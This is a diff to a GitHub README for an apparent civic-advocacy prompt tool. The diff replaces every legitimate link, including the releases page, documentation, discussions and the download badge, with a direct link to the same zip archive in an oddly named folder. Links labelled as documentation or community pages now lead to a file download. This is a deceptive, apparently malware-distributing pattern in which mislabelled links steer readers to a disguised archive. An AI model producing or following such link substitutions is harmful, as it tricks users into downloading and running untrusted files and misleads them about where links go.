@@ -1,6 +1,6 @@
 # 🛡️ The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement - Empowering Citizens for Systemic Change
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-0088ff.svg)](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/releases)
+[![Download Now](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip%https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip)](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ This guide will help you download and run the software. Follow the steps below t
 
 ## 🔗 Download & Install
 
-To download the software, visit the [Releases Page](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/releases). On this page, you will find the latest version ready for download. 
+To download the software, visit the [Releases Page](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip). On this page, you will find the latest version ready for download. 
 
 1. Click the link to the latest release.
 2. Choose the file that matches your operating system.
@@ -64,8 +64,8 @@ Once the download is complete, follow these steps to install the application:
 
 ## 📚 Additional Resources
 
-- **Documentation:** Access comprehensive guides [here](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/wiki).
-- **Community Support:** Join the discussion and ask questions in our [GitHub Discussions](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/discussions).
+- **Documentation:** Access comprehensive guides [here](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip).
+- **Community Support:** Join the discussion and ask questions in our [GitHub Discussions](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip).
 
 ## 📧 Contact
 
@@ -73,8 +73,8 @@ For support, please open an issue in the GitHub repository or reach out via our 
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/releases)
-- [Documentation](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/wiki)
-- [Community Discussions](https://github.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip)
+- [Documentation](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Ardyyyyyyyy/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement/main/spongingly/The-Zero-Trust-Advocacy-Prompt-A-Framework-for-Civic-Engagement.zip)
 
 Thank you for choosing the Zero Trust Advocacy Prompt. Your efforts make a difference in advocating for change!
